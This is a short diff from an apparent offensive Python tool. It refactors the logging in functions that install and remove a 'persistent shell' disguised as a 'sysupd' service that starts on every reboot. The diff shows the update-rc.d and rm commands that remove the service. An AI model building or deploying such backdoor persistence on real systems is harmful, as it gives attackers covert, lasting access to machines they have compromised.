@@ -23,9 +23,8 @@ def persistent():
             os.system("update-rc.d sysupd remove")
             os.system("rm /etc/default/sysupd")
             print("[+] Persistent shell successfully removed!")
-            if Logging == "yes":
-                write2file(ActivityLog, "\n\n [ Removed Persistent Service ]")
-                write2file(ActivityLog, "\n Start Time: %s" % logtime)
+            log_msg("\n\n [ Removed Persistent Service ]")
+            log_msg("\n Start Time: %s" % logtime)
         else:
             print("[!] No existing persistent shell found!")
     else:
@@ -75,9 +74,8 @@ def addpersist():
 
             print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
 
-            if Logging == "yes":
-                write2file(ActivityLog, "\n [ Installed Persistent Service ]")
-                write2file(ActivityLog, "\n Start Time: %s" % logtime)
+            log_msg("\n [ Installed Persistent Service ]")
+            log_msg("\n Start Time: %s" % logtime)
 
 
 
